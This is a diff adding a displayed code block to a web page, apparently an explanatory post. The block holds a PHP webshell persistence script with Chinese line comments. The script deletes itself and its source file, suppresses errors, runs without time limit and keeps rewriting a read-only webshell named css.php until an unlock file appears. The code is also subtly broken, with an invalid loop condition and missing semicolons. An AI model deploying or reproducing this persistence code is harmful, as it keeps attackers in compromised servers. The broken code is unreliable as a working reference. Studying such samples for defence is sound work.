@@ -172,6 +172,46 @@
                         </p>
                     </div>
                 </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+<pre>
+<code class="php"> 
+&lt;?php
+    @unlink($_SERVER['SCRIPT_FILENAME']); // 刪除檔案本身
+    error_reporting(0); // 把 Error Log 關掉
+    ignore_user_abort(true); // 忽略 User 連線, 讓連線斷掉後還能繼續 work
+    set_time_limit(0); // 把執行時間設成不中斷
+
+    $js = 'unlock.txt'; // 檢查有沒有解除的檔案
+    $mb = 'css.php';    // 到時要產生的 Webshell 檔名
+    $rm = '1.txt';      // 要產生 webshell 的內容
+    $nr = file_get_contents($rm); // 從 txt 裡拿內容
+    
+    @unlink($rm); // 把剛剛產生內容的 txt 刪掉
+
+    while(1=1)
+    {
+        if( file_exists($js) ) // 檢查有沒有 unlink 的檔案
+        {
+            @unlink($js);       // 刪掉解鎖的 file
+            exit();             // 離開, 關閉
+        }
+        else
+        {
+            @unlink($mb);       // 刪除檔案
+            chmod($mb, 0777);   // 設定權限
+            @unlink($mb);
+            file_put_contents($mb, $nr) // 從檔案裡拿資料
+            chmod($mb, 0444);   // 設定權限
+            usleep(1000000)    
+        }
+    }
+
+</code>
+</pre>
+                    </div>
+                </div>
                 <!-- Page Contect End -->
             </div>
             <!-- /.container-fluid -->
